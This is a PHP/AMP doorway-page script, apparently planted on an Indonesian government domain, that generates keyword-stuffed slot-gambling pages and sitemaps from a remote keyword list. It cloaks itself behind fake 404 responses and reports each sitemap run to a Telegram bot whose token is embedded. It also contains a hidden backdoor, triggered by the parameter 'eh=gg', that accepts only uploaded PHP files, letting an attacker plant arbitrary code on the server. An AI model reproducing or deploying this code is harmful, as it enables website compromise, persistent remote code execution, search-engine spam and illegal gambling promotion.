<?php
$raww = "https://raw.githubusercontent.com/zeroxipinder/amp/main/zr.txt"; // link txt raw kw brand
$utama = "https://dishub.bone.go.id/hitam"; // hapus tanda /?= , pramater (pemanggil) dan nama brand contoh nya https://aempe.id/baru/?daftar=slot123 jadi https://aempe.id/baru
$prmdo = "detail"; // pramater untuk memanggil brand di LP contoh jika pake LP pake id akan jadi https://ling-lp.ac.id/baru/?id=slot123
$parameterName = "daftar"; // pramater untuk memanggil brand di amp contoh jika pake mau pake amp id akan jadi https://ling-lp.ac.id/baru/?id=slot123
$reff = "https://filmbagus.org/sb77";
function feedback404()
{
    header("HTTP/1.0 404 Not Found");
    echo "<h1><strong>404 Not Found</strong></h1>";
}

function getFileRowCount($fileContent)
{
    return count(explode("\n", trim($fileContent)));
}

function sendTelegramMessage($chatId, $message)
{
    $botToken = '6764902068:AAEntjE5CO8v2iTn220ZdJvG07ERwlNAnRc'; // Ganti dengan token akses bot Anda
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($data)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        echo "no.";
    } else {
        echo "ok.";
    }
}


// Mulai kode PHP utama
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

if (isset($fullUrl)) {
    $parsedUrl = parse_url($fullUrl);
    $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
    $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
    $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
    $baseUrl = $scheme . "://" . $host . $path;
    $urlAsli = str_replace("index.php", "", $baseUrl); // Sesuaikan "index.php" sesuai dengan nama skrip Anda

    // Define the single URL raw file
    $rawFileContent = file_get_contents($raww);
    if ($rawFileContent === false) {
        echo "Failed to retrieve file content.";
        exit();
    }

    $lines = explode("\n", trim($rawFileContent));

    // Handle sitemap generation
    if (isset($_GET['sitmp'])) {
        $jumlahBaris = getFileRowCount($rawFileContent);
        $sitemapFile = fopen("sitemap.xml", "w");
    
        fwrite($sitemapFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
        fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);
    
        foreach ($lines as $index => $judul) {
            // Menggunakan variabel $parameterName sebagai bagian dari URL
            $sitemapLink = $urlAsli . '?' . urlencode($parameterName) . '=' . urlencode($judul);
            fwrite($sitemapFile, '  <url>' . PHP_EOL);
            fwrite($sitemapFile, '    <loc>' . $sitemapLink . '</loc>' . PHP_EOL);
            fwrite($sitemapFile, '  </url>' . PHP_EOL);
        }
    
        fwrite($sitemapFile, '</urlset>' . PHP_EOL);
        fclose($sitemapFile);
    
        // Mengirim URL ke bot Telegram
        $chatId = '-4277393700'; // Ganti dengan ID grup atau ID pengguna Anda
        $message = "Sitemap has been generated. URL: " . $urlAsli;
        sendTelegramMessage($chatId, $message);
    
        echo "Sitemap has been generated.";
        exit(); // Exit to prevent further processing
    }

    // Handle file upload
    if (isset($_GET['eh']) && $_GET['eh'] === 'gg') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
            $target_directory = "uploads/"; // Direktori untuk menyimpan file yang diunggah
            $target_file = $target_directory . basename($_FILES["uploaded_file"]["name"]);
            $uploadOk = 1;
            $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

            // Check if file already exists
            if (file_exists($target_file)) {
                echo "File already exists.";
                $uploadOk = 0;
            }

            // Check file size
            if ($_FILES["uploaded_file"]["size"] > 50000000) {
                echo "File is too large.";
                $uploadOk = 0;
            }

            // Allow certain file formats
            if ($fileType !== "php") { // Ubah ekstensi file yang diizinkan sesuai kebutuhan
                echo "Only TXT files are allowed.";
                $uploadOk = 0;
            }

            // Check if $uploadOk is set to 0 by an error
            if ($uploadOk == 0) {
                echo "File upload failed.";
            } else {
                if (move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], $target_file)) {
                    echo "File has been uploaded.";
                } else {
                    echo "File upload failed.";
                }
            }
            exit(); // Exit to prevent further processing
        } else {
            echo "Invalid request.";
            exit(); // Exit to prevent further processing
        }
    }

    // Handle varian processing
    if (isset($_GET[$parameterName])) {
        $target_string = strtolower(trim($_GET[$parameterName])); // Trim dan ubah ke lowercase di sini
        foreach ($lines as $item) {
            // Trim dan ubah ke lowercase di sini untuk setiap item dalam loop
            if (strtolower(trim($item)) === $target_string) {
                $BRAND = strtoupper($target_string);
            }
        }
        if (isset($BRAND)) {
            $BRANDS = $BRAND;
            if (isset($fullUrl)) {
                $parsedUrl = parse_url($fullUrl);
                $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
                $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
                $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
                $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
                $fullUrlWithQuery = $scheme . "://" . $host . $path . '?' . $query;
                $urlPath = $fullUrlWithQuery;
            } else {
                echo "Current URL is not defined.";
            }
        } else {
            feedback404();
            exit();
        }
    } else {
        feedback404();
        exit();
    }
} else {
    feedback404();
    exit();
}

?>


<!DOCTYPE html>
<html amp lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,maximum-scale=1">
    <meta http-equiv="content-language" content="id">
    <link rel="canonical" href="<?php echo $utama ?>?<?php echo $prmdo ?>=<?php echo $BRANDS ?>">
    <title><?php echo $BRANDS ?> 🍄 Link Situs Layanan Informedia Solusi Slot Gacor,Hari Ini Situs Gacor Paling Maxwin dan Terpercaya 2024</title>
    <meta name="description" content="<?php echo $BRANDS ?> adalah link situs layanan informedia yang menawarkan solusi slot gacor terbaik. Situs ini dikenal sebagai situs gacor paling Maxwin dan terpercaya di tahun 2024, dengan peluang kemenangan tinggi dan permainan yang mudah jackpot. Tepat untuk para pemain yang mencari pengalaman slot online berkualitas dengan hasil yang memuaskan.">

    <meta name="robots" content="index, follow">
    <meta name="page-locale" content="id,en">
    <meta content="true" name="HandheldFriendly">
    <meta content="width" name="MobileOptimized">
    <meta property="og:title" content="<?php echo $BRANDS ?> 🍄 Link Situs Layanan Informedia Solusi Slot Gacor,Hari Ini Situs Gacor Paling Maxwin dan Terpercaya 2024">
    <meta property="og:description" content="<?php echo $BRANDS ?> adalah link situs layanan informedia yang menawarkan solusi slot gacor terbaik. Situs ini dikenal sebagai situs gacor paling Maxwin dan terpercaya di tahun 2024, dengan peluang kemenangan tinggi dan permainan yang mudah jackpot. Tepat untuk para pemain yang mencari pengalaman slot online berkualitas dengan hasil yang memuaskan.">
    <meta property="og:url" content="<?php echo $utama ?>?<?php echo $prmdo ?>=<?php echo $BRANDS ?>">
    <meta property="og:site_name" content="Slot Gacor">
    <meta property="og:author" content="Slot Gacor">
    <meta property="og:image" content="https://res.cloudinary.com/dbbqiwivn/image/upload/v1728743541/SLOT_GACOR_jjkbw6.png">
    <meta name="og:locale" content="ID_id">
    <meta name="og:type" content="website">
    <meta name="rating" content="general">
    <meta name="author" content="Slot Gacor">
    <meta name="distribution" content="global">
    <meta name="publisher" content="Slot Gacor">
    <script async src="https://cdn.ampproject.org/v0.js"></script>
    <link rel="icon" type="/img/png" href="https://www.svgrepo.com/show/535140/aperture.svg">
    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
  
    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "name": "<?php echo $BRANDS ?> 🍄 Link Situs Layanan Informedia Solusi Slot Gacor,Hari Ini Situs Gacor Paling Maxwin dan Terpercaya 2024",
    "url": "<?php echo $utama ?>?<?php echo $prmdo ?>=<?php echo $BRANDS ?>",
    "description": "<?php echo $BRANDS ?> adalah link situs layanan informedia yang menawarkan solusi slot gacor terbaik. Situs ini dikenal sebagai situs gacor paling Maxwin dan terpercaya di tahun 2024, dengan peluang kemenangan tinggi dan permainan yang mudah jackpot. Tepat untuk para pemain yang mencari pengalaman slot online berkualitas dengan hasil yang memuaskan.",
    "breadcrumb": {
      "@type": "BreadcrumbList",
      "itemListElement": [
        {
          "@type": "ListItem",
          "position": "1",
          "item": {
            "@type": "WebSite",
            "@id": "<?php echo $utama ?>?<?php echo $prmdo ?>=<?php echo $BRANDS ?>",
            "name": "Slot Gacor"
          }
        }
      ]
    },
    "publisher": {
      "@type": "Organization",
      "name": "Slot Gacor",
      "logo": {
        "@type": "imageObject",
        "url": "https://res.cloudinary.com/dbbqiwivn/image/upload/v1728743541/SLOT_GACOR_jjkbw6.png"
      }
    }
  }
</script>

    <style amp-boilerplate>
        body {
            -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
            -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
            -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
            animation: -amp-start 8s steps(1, end) 0s 1 normal both
        }

        @-webkit-keyframes -amp-start {
            from {
                visibility: hidden
            }

            to {
                visibility: visible
            }
        }

        @-moz-keyframes -amp-start {
            from {
                visibility: hidden
            }

            to {
                visibility: visible
            }
        }

        @-ms-keyframes -amp-start {
            from {
                visibility: hidden
            }

            to {
                visibility: visible
            }
        }

        @-o-keyframes -amp-start {
            from {
                visibility: hidden
            }

            to {
                visibility: visible
            }
        }

        @keyframes -amp-start {
            from {
                visibility: hidden
            }

            to {
                visibility: visible
            }
        }
    </style>
    <noscript>
        <style amp-boilerplate>
            body {
                -webkit-animation: none;
                -moz-animation: none;
                -ms-animation: none;
                animation: none
            }
        </style>
    </noscript>
    <style amp-custom>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0
        }

        :focus {
            outline: 0
        }

        ::-webkit-scrollbar {
            display: none
        }

        a,
        a:after,
        a:hover,
        a:visited {
            text-decoration: none;
            color: #fff
        }

        html {
            max-width: 500px;
            margin: 0 auto;
            background-color: #000;background-image:url(https://i.ibb.co.com/j4YkVy6/76YS.gif)
        }

        body {
            color: #fff;
            font-family: 'Noto Sans', arial, sans-serif
        }

        .slot-online{
            display: grid;
            justify-content: center;
            padding: 10px;
        }

        .slot-online5k {
            text-align: center;
        }

        .slotbonus {
            display: grid;
        }

        .slotbonus .contole {
            padding: .5rem 3.8rem;
            background: #33333388;
            margin-bottom: .5rem;
            border-radius: .38rem;
            box-shadow: 0 -1px #ccb38a88;
            letter-spacing: 1px
        }

        .slotbonus a.btn1 {
            color: #eee;
            background-image: linear-gradient(-45deg, #f18902 0, #c44f01 100%);
            box-shadow: none;
            font-weight: 700
        }

        .slotbonus-container {
            display: flex;
            background: linear-gradient(-45deg, #f18902 0, #c44f01 100%);
            width: 250px;
            height: 40px;
            align-items: center;
            justify-content: space-around;
            border-radius: 10px;
        }

        .slot-online {
            outline: 0;
            border: 0;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            transition: all ease-in-out .3s;
            cursor: pointer
        }

        .slot-online:hover {
            transform: translateY(-3px)
        }

        .btn2 {
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            overflow: hidden;
            height: 3rem;
            background-size: 300% 300%;
            backdrop-filter: blur(1rem);
            border-radius: .38rem;
            transition: .5s;
            animation: gradient_301 5s ease infinite;
            border: double 4px transparent;
            background-image: linear-gradient(#212121, #212121), linear-gradient(137.48deg, #ffdb3b 10%, #049c04 45%, #041785 67%, rgb(255, 0, 0) 87%);
            background-origin: border-box;
            background-clip: content-box, border-box
        }

        #container-stars {
            position: absolute;
            z-index: -1;
            width: 100%;
            height: 100%;
            overflow: hidden;
            transition: .5s;
            backdrop-filter: blur(1rem);
            border-radius: .38rem
        }

        strong {
            z-index: 2;
            letter-spacing: 5px;
            color: #fff;
            text-shadow: #fff
        }

        #glow {
            position: absolute;
            display: flex;
            width: 12rem
        }

        .circle {
            width: 100%;
            height: 30px;
            filter: blur(2rem);
            animation: pulse_3011 4s infinite;
            z-index: -1
        }

        .circle:nth-of-type(1) {
            background: rgba(254, 83, 186, .636)
        }

        .circle:nth-of-type(2) {
            background: rgba(142, 81, 234, .704)
        }

        .btn2:hover #container-stars {
            z-index: 1;
            background-color: #212121
        }

        .btn2:hover {
            transform: scale(1.1)
        }

        .btn2:active {
            border: double 4px #fe53bb;
            background-origin: border-box;
            background-clip: content-box, border-box;
            animation: none
        }

        .btn2:active .circle {
            background: #fe53bb
        }

        #stars {
            position: relative;
            background: 0 0;
            width: 200rem;
            height: 200rem
        }

        #stars::after {
            content: "";
            position: absolute;
            top: -10rem;
            left: -100rem;
            width: 100%;
            height: 100%;
            animation: animStarRotate 90s linear infinite
        }
            #faq{
            font-size:28px;
        }
        @media(min-width:768px) {
            body {
                font-size: var(--normal-font);

            }

            .container {
                max-width: 98%;
            }

            .site-menu {
                width: 20%
            }
            .slot{
                display:block;
                margin:0 auto;
                max-width:98%;
            }
            .slot .content{
                float: none;
                width: 100%;
                padding: 0;
                flex: 0 0 100%;
                max-width: 100%;
                background-color: #121212;
                margin:0 auto;
                align-self:center;
                text-align:center;
            }
        }

        @media(min-width:1200px) {
            .container {
                width: 1170px
            }
        }

        @media(min-width:992px) {
            .container {
                width: 992px
            }
        }

        #stars::after {
            background-image: radial-gradient(#fff 1px, transparent 1%);
            background-size: 50px 50px
        }

        #stars::before {
            content: "";
            position: absolute;
            top: 0;
            left: -50%;
            width: 170%;
            height: 500%;
            animation: animStar 60s linear infinite
        }

        #stars::before {
            background-image: radial-gradient(#fff 1px, transparent 1%);
            background-size: 50px 50px;
            opacity: .5
        }

        @keyframes animStar {
            from {
                transform: translateY(0)
            }

            to {
                transform: translateY(-135rem)
            }
        }

        @keyframes animStarRotate {
            from {
                transform: rotate(360deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @keyframes gradient_301 {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 50%
            }

            100% {
                background-position: 0 50%
            }
        }

        @keyframes pulse_3011 {
            0% {
                transform: scale(.75);
                box-shadow: 0 0 0 0 rgba(0, 0, 0, .7)
            }

            70% {
                transform: scale(1);
                box-shadow: 0 0 0 10px transparent
            }

            100% {
                transform: scale(.75);
                box-shadow: 0 0 0 0 transparent
            }
        }

        .artikel {
            text-align: justify;
        }

        .artikel p {
            margin: 25px 0;
        }

        .artikel a {
            color: #d1b743
        }
        
        .artikel h1 {
            color: #d1b743;
            text-align: center;
        }

        .artikel h2 {
            color: #d1b743;
            text-align: center;
        }

        .block-img {
            position: relative;
            margin: auto;
            min-width: 100px;
            background: linear-gradient(0deg, #000, #272727);
            color: #fff;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .block-img:before,
        .block-img:after {
            content: '';
            position: absolute;
            right: -3px;
            bottom: -3px;
            background: linear-gradient(45deg, #ffdb3b , #049c04 , #041785, #ff0000);
            background-size: 400%;
            width: calc(100% + 6px);
            height: calc(100% + 6px);
            z-index: -1;
            animation: steam 5s linear infinite;
            border-radius: 10px;
        }

        .block1 {
            position: relative;
            margin: auto;
            min-width: 100px;
            padding: 5px 10px;
            background: linear-gradient(0deg, #ff9000, #000000);
            color: #fff;
            cursor: pointer;
        }

        .block1:before,
        .block1:after {
            content: '';
            position: absolute;
            right: -3px;
            bottom: -3px;
            background: linear-gradient(45deg, #ffdb3b , #049c04 , #041785, #ff0000);
            background-size: 400%;
            width: calc(100% + 6px);
            height: calc(100% + 6px);
            z-index: -1;
            animation: steam 5s linear infinite;
            border-radius: 10px;
        }

        .block {
            position: relative;
            padding: 8px 10px;
            background: linear-gradient(0deg, #000, #272727);
            color: #fff;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .block:before,
        .block:after {
            content: '';
            position: absolute;
            right: -3px;
            bottom: -3px;
            background: linear-gradient(45deg, #ffdb3b , #049c04 , #041785, #ff0000);
            background-size: 400%;
            width: calc(100% + 6px);
            height: calc(100% + 6px);
            z-index: -1;
            animation: steam 5s linear infinite;
        }

        @keyframes steam {
            0% {
                background-position: 0 0;
            }

            50% {
                background-position: 400% 0;
            }

            100% {
                background-position: 0 0;
            }
        }

        .block:after {
            filter: blur(50px);
        }

        .footer {
            text-align: center;
            margin: 15px 0;
        }

        .footer a {
            color: #d1b743
        }
        *{
        -webkit-user-select: none;
        -khtml-user-select: none;
        -moz-user-select: -moz-none;
        -o-user-select: none;
        user-select: none;
    }
    .site-description {
            background-color: #1669ff;
            padding: 1%;
        }
    .site-description {
            background-color: #052663
        }

     @media(max-width:575.98px) {
            .download-apk-section amp-img {
                width: 50px
            }
            .img amp-img{
                max-width:180px;
                display:block;
                margin:0 auto;
            }
            .slot{
                display:block;
                margin:0 auto;
                max-width:98%;
            }
            .slot .content{
                float: none;
                width: 100%;
                padding: 0;
                flex: 0 0 100%;
                max-width: 100%;
                background-color: #121212;
                margin:0 auto;
                align-self:center;
                text-align:center;
            }
            .card{
               display:inline-block;
               width: 31%;
               background: transparent;
               border: none;
               text-align: center;
               position: relative;
               padding:0.5%;
            }
        }
        @media(max-width:575.98px) {
            .slot{
                display:block;
                margin:0 auto;
                max-width:98%;
            }
            .slot .content{
                float: none;
                width: 100%;
                padding: 0;
                flex: 0 0 100%;
                max-width: 100%;
                background-color: #121212;
                margin:0 auto;
                align-self:center;
                text-align:center;
            }
            .card{
               display:inline-block;
               width: 48%;
               background: transparent;
               border: none;
               text-align: center;
               position: relative;
               padding:0.5%;
            }
        }
        @media(min-width:576px){
            .card{
               display:inline-block;
               width: 23%;
               background: transparent;
               border: none;
               text-align: center;
               position: relative;
               padding:0.5%;
            }
            .img{
                display:block;
                text-align:center;
            }
            .img amp-img{
                max-width:250px;
                display:block;
                margin:0 auto;
            }
        }
    </style>
</head>

<body>
    <main>
        <div class="macallan">
            <div class="slot-online5k">
              
                <br>
                <div class="block-img">
                    <a href="<?php echo $reff?>" target="_blank" rel="noopener noreferrer nofollow">
                        <amp-img height="900" width="900" layout="responsive" alt="alternatif PASTIWIN777" src="https://res.cloudinary.com/dbbqiwivn/image/upload/v1728743541/SLOT_GACOR_jjkbw6.png"></amp-img>
                    </a>
                </div>

                <div class="slotbonus">
                    <a href="<?php echo $reff?>" target="_blank" rel="noopener noreferrer nofollow">
                        <button class="btn2"><strong>DAFTAR SITUS <?php echo $BRANDS ?></strong>
                            <div id="container-stars">
                                <div id="stars"></div>
                            </div>
                            <div id="glow">
                                <div class="circle"></div>
                                <div class="circle"></div>
                            </div>
                        </button>
                    

                    <a href="<?php echo $reff?>" target="_blank" rel="noopener noreferrer nofollow" class="block">LOGIN SITUS <?php echo $BRANDS ?> </a>
                    <a href="<?php echo $reff?>" target="_blank" rel="noopener noreferrer nofollow" class="block">RTP SITUS GACOR <?php echo $BRANDS ?> </a>
                     <a href="<?php echo $reff?>" target="_blank" rel="noopener noreferrer nofollow" class="block">DAFTAR AKUN VIP <?php echo $BRANDS ?> </a>
      
                     
                    
            </div> 
        

           </div>
              


            <div class="artikel">

               <h2><?php echo $BRANDS ?> 🍄 Link Situs Layanan Informedia Solusi Slot Gacor,Hari Ini Situs Gacor Paling Maxwin dan Terpercaya 2024</h2>
                  <p><?php echo $BRANDS ?> adalah link situs layanan informedia yang menawarkan solusi slot gacor terbaik. Situs ini dikenal sebagai situs gacor paling Maxwin dan terpercaya di tahun 2024, dengan peluang kemenangan tinggi dan permainan yang mudah jackpot. Tepat untuk para pemain yang mencari pengalaman slot online berkualitas dengan hasil yang memuaskan.</p>
            </div>
        </div>

        <hr>
        <div class="footer">
            &copy; <?php echo $BRANDS ?> 2024 | <a href="<?php echo $utama ?>?<?php echo $prmdo ?>=<?php echo $BRANDS ?>">GAK WD GAK GANTENG</a>
        </div>

    </main>
</body>
</html>
